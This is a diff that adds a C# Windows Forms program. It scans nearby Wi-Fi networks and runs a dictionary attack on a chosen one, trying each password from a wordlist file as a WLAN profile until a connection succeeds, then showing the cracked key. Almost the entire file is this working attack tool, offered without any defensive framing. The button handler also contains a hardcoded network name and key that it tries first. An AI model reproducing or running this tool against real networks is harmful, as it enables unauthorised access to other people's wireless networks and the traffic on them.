@@ -1,0 +1,274 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using NativeWifi;
+using System.IO;
+namespace WindowsFormsApplication2
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+
+
+
+
+
+
+
+        public static string ByteArrayToString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        } 
+        public int interfaz;
+        public int red;
+        public int REDBSS;
+        public int AVAABLENET;
+        Wlan.WlanBssEntry[] lista_bss;
+        private WlanClient client = new WlanClient();
+        Wlan.WlanAvailableNetwork[] lista_redes;        
+        private void Form1_Load(object sender, EventArgs e)
+        {
+    
+            WlanClient client = new WlanClient();
+            int longitud = client.Interfaces.GetLength(0);
+            for (int i = 0; i < longitud; i++)
+            {
+
+
+
+                listBox1.Items.Add(client.Interfaces[i].InterfaceName);
+            }
+
+        }
+
+
+
+
+        private void conectar(string nombre_red, string key)
+        {
+            //string profileName = "Cheesecake"; // this is also the SSID
+            //string mac = "52544131303235572D454137443638";
+            //string key = "key";
+            bool connected = false;
+            string profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>open</authentication><encryption>WEP</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>networkKey</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", nombre_red, key);
+            client.Interfaces[interfaz].SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
+            connected=client.Interfaces[interfaz].ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, nombre_red, 1000);
+            
+
+        }
+
+        static long CountLinesInFile(string f)
+        {
+            long count = 0;
+            using (StreamReader r = new StreamReader(f))
+            {
+                string line;
+                while ((line = r.ReadLine()) != null)
+                {
+                    count++;
+                }
+
+            }
+            return count;
+        }
+
+        private void ataque_dicc(string nombre_red,string cifrado,string diccionario, string auth,int timeout)
+        {
+            //string profileName = "Cheesecake"; // this is also the SSID
+            //string mac = "52544131303235572D454137443638";
+            //string key = "key";
+            bool connected = false;
+            long lineas = CountLinesInFile(diccionario);
+
+            progressBar1.Maximum=(int)lineas;
+            progressBar1.Value = 1;
+            progressBar1.Step = 1;
+            string profileXml;
+            string key="";
+            System.IO.StreamReader reader = new StreamReader(diccionario);
+            while (!connected&&!reader.EndOfStream)
+            {   
+                
+               
+                
+                key = reader.ReadLine();
+                profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>{2}</authentication><encryption>{3}</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>networkKey</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", nombre_red, key,auth,cifrado);
+                client.Interfaces[interfaz].SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
+                connected = client.Interfaces[interfaz].ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, nombre_red,timeout*1000);
+                progressBar1.PerformStep();
+            } if (connected) { label8.Text = key; label8.Visible = true; }
+
+        }
+
+
+
+
+
+
+        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            interfaz = listBox1.SelectedIndex;
+        }
+
+
+
+        private bool compara(Wlan.Dot11Ssid X, Wlan.Dot11Ssid Y)
+        {
+            int i = 0;
+            if (X.SSIDLength != Y.SSIDLength) return false;
+            while (i < X.SSIDLength & Y.SSID[i] == X.SSID[i])
+            {
+                i++;
+            }
+
+            return Y.SSID[i] == X.SSID[i];
+        }
+
+
+
+
+        private Wlan.WlanAvailableNetwork devuelve_red(Wlan.Dot11Ssid X,Wlan.WlanAvailableNetwork[] lista)
+        {   Wlan.WlanAvailableNetwork ret= new Wlan.WlanAvailableNetwork();
+            int long2 = lista.GetLength(0);
+        
+            for (int i = 0; i < long2; i++)
+            {
+                if (compara(X,lista[i].dot11Ssid))
+                {
+                    ret = lista[i];
+                    break;
+                }
+            }
+                return ret;
+                
+            
+        }
+
+        private void scan_Click(object sender, EventArgs e)
+        {
+            lista_bss=client.Interfaces[interfaz].GetNetworkBssList();
+
+            client.Interfaces[interfaz].Scan();
+          
+            lista_redes = client.Interfaces[interfaz].GetAvailableNetworkList(0);
+            listView1.Items.Clear();
+            listView1.Columns.Add("ESSID");
+            listView1.Columns.Add("BSSID");
+            listView1.Columns.Add("Autenticación");
+            listView1.Columns.Add("Cifrado");
+            listView1.Columns.Add("Conectable");
+            int longitud = lista_bss.GetLength(0);
+            Wlan.WlanAvailableNetwork WLAN = new Wlan.WlanAvailableNetwork();
+            for (int i = 0; i < longitud; i++)
+            {
+                WLAN = devuelve_red(lista_bss[i].dot11Ssid, lista_redes);
+                
+                
+                ListViewItem item1 = new ListViewItem(Encoding.ASCII.GetString(lista_bss[i].dot11Ssid.SSID));
+                item1.SubItems.Add(ByteArrayToString(lista_bss[i].dot11Bssid));
+                item1.SubItems.Add(WLAN.dot11DefaultAuthAlgorithm.ToString());
+                item1.SubItems.Add(WLAN.dot11DefaultCipherAlgorithm.ToString());
+                item1.SubItems.Add(WLAN.networkConnectable.ToString());
+                listView1.Items.Add(item1);
+                
+
+            }
+
+
+
+        }
+
+        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            try { REDBSS = listView1.SelectedIndices[0];
+            textBox1.Text = Encoding.ASCII.GetString(lista_bss[REDBSS].dot11Ssid.SSID);
+            Wlan.WlanAvailableNetwork WLAN = devuelve_red(lista_bss[REDBSS].dot11Ssid, lista_redes);
+            textBox3.Text=(WLAN.dot11DefaultAuthAlgorithm.ToString());
+            textBox2.Text=(WLAN.dot11DefaultCipherAlgorithm.ToString());
+            }
+            catch { }
+//            textBox1.Text = REDBSS.ToString();
+            
+
+        }
+        private string auth(string autenticate){
+            if (autenticate == "IEEE80211_Open") { return "OPEN"; }
+            if (autenticate == "IEEE80211_SharedKey") { return "SHAREDKEY";  }
+            else if(autenticate =="WPA"){return "WPA";}
+            //else if(cifrado =="WPA_None"){return "WPAPSK"}
+            else if(autenticate =="WPA_PSK"){return "WPAPSK";}
+            return "";
+           //lan.Dot11AuthAlgorithm.WPA_PSK
+        }
+        private string cif(string cipher)
+        {
+            if (cipher == "CCMP") { return "AES";}
+            else if (cipher == "TKIP") { return "TKIP"; }
+            else if (cipher == "WEP") { return "WEP"; }
+            return "";
+           // Wlan.Dot11CipherAlgorithm.
+        }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            conectar("WLAN_50", "b3rn%");
+            if (textBox1.Text != "" && textBox2.Text != "" && textBox3.Text != "" && textBox4.Text != "")
+            {
+                
+                string cifrado=cif(textBox2.Text);
+                string autenticacion=auth(textBox3.Text);
+                if (cifrado == "" || autenticacion == "")
+                {
+                    label8.Text = "No implementado aún";
+                    label8.Visible = true;
+                }
+
+                label8.Visible = false;
+                label5.Visible = true;
+                progressBar1.Visible = true;
+                
+               ataque_dicc(textBox1.Text, cifrado, textBox4.Text, autenticacion, (int)(numericUpDown1.Value));
+               // ataque_dicc(textBox1.Text, autenticacion, textBox4.Text, cifrado, (int)(numericUpDown1.Value));
+
+                label5.Visible = false;
+                progressBar1.Visible = false;
+            }
+            else
+            {
+                label8.Text = "Debes rellenar todos los campos";
+                label8.Visible = true;
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            openFileDialog1.AddExtension = true;
+            openFileDialog1.AutoUpgradeEnabled = true;
+            openFileDialog1.CheckFileExists = true;
+            openFileDialog1.CheckPathExists = true;
+            openFileDialog1.Multiselect = false;
+            openFileDialog1.ShowDialog();
+
+            // openFileDialog1.Filter = "txt";
+        }
+
+        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
+        {
+            textBox4.Text = openFileDialog1.FileName; button1.Enabled = true; 
+        }
+
+
+    }
+
+}
